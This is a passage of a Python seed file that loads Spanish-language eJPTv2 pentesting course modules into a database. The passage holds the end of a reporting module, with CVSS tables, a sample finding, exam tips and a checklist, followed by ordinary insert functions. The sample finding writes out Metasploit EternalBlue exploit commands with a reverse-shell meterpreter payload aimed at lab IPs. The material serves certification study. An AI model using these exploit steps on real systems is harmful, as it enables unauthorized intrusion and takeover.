   - Outputs completos de herramientas
   - Hashes de evidencias
   - Glosario
```

---

## Clasificación CVSS 3.1

El **CVSS (Common Vulnerability Scoring System)** es el estándar para puntuar vulnerabilidades.

| Puntuación | Criticidad | Color |
|-----------|-----------|-------|
| 9.0 – 10.0 | Crítica | 🔴 Rojo oscuro |
| 7.0 – 8.9 | Alta | 🟠 Naranja |
| 4.0 – 6.9 | Media | 🟡 Amarillo |
| 0.1 – 3.9 | Baja | 🟢 Verde |
| 0.0 | Informativa | ⚪ Gris |

**Componentes CVSS:**
```
Vector de Ataque (AV):    Network / Adjacent / Local / Physical
Complejidad (AC):         Low / High
Privilegios (PR):         None / Low / High
Interacción Usuario (UI): None / Required
Confidencialidad (C):     None / Low / High
Integridad (I):           None / Low / High
Disponibilidad (A):       None / Low / High

Ejemplo EternalBlue: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 CRÍTICO
```

---

## Ejemplo de Hallazgo Documentado

```markdown
## VUL-001: MS17-010 EternalBlue — RCE sin Autenticación

**Criticidad:** CRÍTICA (CVSS 9.8)
**Host afectado:** 192.168.1.100 (WIN-SERVER01)
**Servicio:** SMB — Puerto 445/TCP
**CVE:** CVE-2017-0144

### Descripción
El sistema no tiene aplicado el parche MS17-010, que corrige una vulnerabilidad
crítica en el protocolo SMBv1. Un atacante sin autenticación puede ejecutar código
arbitrario con privilegios SYSTEM en el sistema afectado.

### Pasos de Reproducción
1. Verificar vulnerabilidad:
   `nmap --script smb-vuln-ms17-010 192.168.1.100`

2. Ejecutar exploit en Metasploit:
   ```
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS 192.168.1.100
   set payload windows/x64/meterpreter/reverse_tcp
   set LHOST 192.168.1.50
   run
   ```

3. Evidencia: Sesión Meterpreter con NT AUTHORITY\\SYSTEM obtenida.

### Impacto
Compromiso total del sistema. El atacante puede extraer contraseñas,
instalar backdoors, y usar la máquina como pivote hacia otras redes.

### Remediación
- Aplicar el parche de seguridad KB4012212 (disponible en Windows Update)
- Deshabilitar SMBv1: `Set-SmbServerConfiguration -EnableSMB1Protocol $false`
- Bloquear puerto 445 en el firewall perimetral para acceso externo
- Prioridad: INMEDIATA
```

---

## Tips para el Examen eJPTv2

### Antes del examen

```
✅ Tener Kali Linux actualizado y funcional
✅ Metasploit actualizado: msfupdate
✅ Wordlists descargadas: /usr/share/wordlists/
   → rockyou.txt descomprimido
   → SecLists instalado: apt install seclists
✅ Revisar la teoría de pivoting (siempre hay pivoting)
✅ Practicar en TryHackMe: "Jr Penetration Tester" path
✅ Tener plantillas de comandos preparadas
```

### Durante el examen

```
1. LEE LAS PREGUNTAS PRIMERO
   → Saber qué se te pide orienta tu trabajo
   → Muchas respuestas son IPs, versiones, flags

2. MAPEA TODA LA RED ANTES DE EXPLOTAR
   → nmap -sn a todos los rangos posibles
   → Anota cada IP, puerto, servicio, versión

3. DOCUMENTA TODO
   → Toma capturas de pantalla de cada hallazgo
   → Copia/pega los outputs de Meterpreter
   → Guarda cada credencial obtenida

4. GESTIONA EL TIEMPO
   → No te quedes atascado >45 min en una máquina
   → Vuelve después con mente fresca

5. PIVOTING ES CLAVE
   → Si una máquina tiene 2 IPs → configura autoroute
   → Escanea la subred interna desde el principio
```

### Errores comunes

```
❌ No escanear todos los puertos (-p- es lento pero necesario)
❌ Olvidar UDP (DNS 53, SNMP 161 → info valiosa)
❌ No configurar autoroute al comprometer la primera máquina
❌ Usar payload x86 en sistema x64
❌ Olvidar probar credenciales por defecto
❌ No revisar robots.txt y código fuente en webs
❌ Rendirse ante el primer error de Metasploit
```

---

## Recursos de Estudio Recomendados

### Gratuitos

```
TryHackMe (https://tryhackme.com):
  - Learning Path: "Jr Penetration Tester" ← el más importante
  - Room: "Blue"        (EternalBlue real)
  - Room: "Metasploit"  (framework completo)
  - Room: "OWASP Top 10"
  - Room: "Nmap"
  - Room: "Hydra"
  - Room: "SQL Injection"

HackTheBox Starting Point:
  - Tier 0: Meow, Fawn, Dancing, Redeemer
  - Tier 1: Appointment, Sequel, Crocodile, Responder

YouTube:
  - TCM Security (John Hammond): cursos gratuitos
  - IppSec: writeups de HackTheBox
  - David Bombal: redes + hacking ético
```

### De pago

```
INE Starter Pass (~50$/mes):
  - "Penetration Testing Student" (PTS) ← curso oficial eJPT
  - Incluye labs prácticos
  - Voucher del examen incluido en algunos planes

TCM Security Academy:
  - "Practical Ethical Hacking" ← excelente relación calidad/precio
```

---

## Checklist del Día del Examen

```
ANTES:
☐ Dormir bien la noche anterior
☐ Kali Linux funcionando y actualizado
☐ Metasploit db arrancado: msfdb init && msfconsole
☐ Wordlists disponibles (rockyou, SecLists)
☐ Workspace configurado en Metasploit:
   workspace -a eJPT_exam

DURANTE EL EXAMEN:
☐ Leer TODAS las preguntas primero (5 min)
☐ nmap -sn a los rangos que indique la VPN
☐ Escaneo completo de cada host descubierto
☐ Anotar todas las versiones de servicios
☐ Probar credenciales por defecto antes de brute force
☐ Buscar en searchsploit + Metasploit cada versión
☐ En cada shell: ip addr / ipconfig (buscar subredes)
☐ Configurar autoroute si hay subredes
☐ Guardar capturas de pantalla de todo

ORGANIZACIÓN:
☐ Carpeta por máquina: mkdir 192.168.1.100
☐ Log de Metasploit: spool /tmp/msf_log.txt
☐ Notas en texto plano con IPs, credenciales, flags
```

---

> 🎯 **Recuerda:** El eJPTv2 es un examen práctico, no teórico. Las habilidades se adquieren practicando en máquinas reales. Invierte al menos 40-50 horas en TryHackMe antes de intentar el examen. ¡Buena suerte!
""",
    },
]


# ══════════════════════════════════════════════════════════════════════════════
#  FUNCIONES DE SEED
# ══════════════════════════════════════════════════════════════════════════════

def seed_ciberseguridad_teoria():
    """Inserta el subject Ciberseguridad y sus 5 guías generales si no existen."""
    try:
        from database import SessionLocal, TheorySubject, TheoryPost
    except ImportError:
        logger.warning("seed_ciberseguridad: no se pudo importar database, omitiendo.")
        return

    db = SessionLocal()
    try:
        subject = db.query(TheorySubject).filter(TheorySubject.slug == "ciberseguridad").first()
        if not subject:
            subject = TheorySubject(
                name="Ciberseguridad",
                slug="ciberseguridad",
                description="Fundamentos de ciberseguridad, pentesting, criptografía, firewalls, análisis forense y auditoría de seguridad.",
                icon="🔐",
                order_index=6,
            )
            db.add(subject)
            db.flush()
            logger.info("seed_ciberseguridad: subject 'Ciberseguridad' creado.")
        else:
            logger.info(f"seed_ciberseguridad: subject ya existe (id={subject.id}).")

        added = 0
        for post_data in CIBER_POSTS:
            existing = db.query(TheoryPost).filter(TheoryPost.slug == post_data["slug"]).first()
            if not existing:
                post = TheoryPost(
                    subject_id=subject.id,
                    title=post_data["title"],
                    slug=post_data["slug"],
                    markdown_content=post_data["content"],
                    order_index=post_data["order_index"],
                    is_free=False,
                )
                db.add(post)
                added += 1
                logger.info(f"seed_ciberseguridad: + '{post_data['title'][:60]}'")

        db.commit()
        if added:
            logger.info(f"seed_ciberseguridad: {added} posts de Ciberseguridad insertados.")
        else:
            logger.info("seed_ciberseguridad: todos los posts ya existían.")
    except Exception as e:
        db.rollback()
        logger.error(f"seed_ciberseguridad: ERROR — {e}")
    finally:
        db.close()


def seed_ejptv2_teoria():
    """Inserta el subject eJPTv2 y sus 7 módulos completos si no existen."""
    try:
        from database import SessionLocal, TheorySubject, TheoryPost
    except ImportError:
        logger.warning("seed_ejptv2: no se pudo importar database, omitiendo.")
        return

    db = SessionLocal()
    try:
        subject = db.query(TheorySubject).filter(TheorySubject.slug == "ejptv2").first()
        if not subject:
            subject = TheorySubject(
                name="eJPTv2 - Junior Penetration Tester",
                slug="ejptv2",
                description="Preparación completa para la certificación eJPTv2: metodología pentesting, redes, enumeración, Metasploit, web hacking, post-explotación y reporting.",
                icon="🎯",
                order_index=7,
            )
            db.add(subject)
            db.flush()
            logger.info("seed_ejptv2: subject 'eJPTv2' creado.")
        else:
            logger.info(f"seed_ejptv2: subject ya existe (id={subject.id}).")

        added = 0
        for post_data in EJPTV2_POSTS:
            existing = db.query(TheoryPost).filter(TheoryPost.slug == post_data["slug"]).first()
            if not existing:
                post = TheoryPost(
                    subject_id=subject.id,
                    title=post_data["title"],
                    slug=post_data["slug"],
                    markdown_content=post_data["content"],
                    order_index=post_data["order_index"],
                    is_free=False,
                )
                db.add(post)
                added += 1
                logger.info(f"seed_ejptv2: + '{post_data['title'][:60]}'")

        db.commit()
        if added:
            logger.info(f"seed_ejptv2: {added} módulos eJPTv2 insertados.")
        else:
            logger.info("seed_ejptv2: todos los módulos ya existían.")
    except Exception as e:
        db.rollback()
        logger.error(f"seed_ejptv2: ERROR — {e}")
    finally:
        db.close()
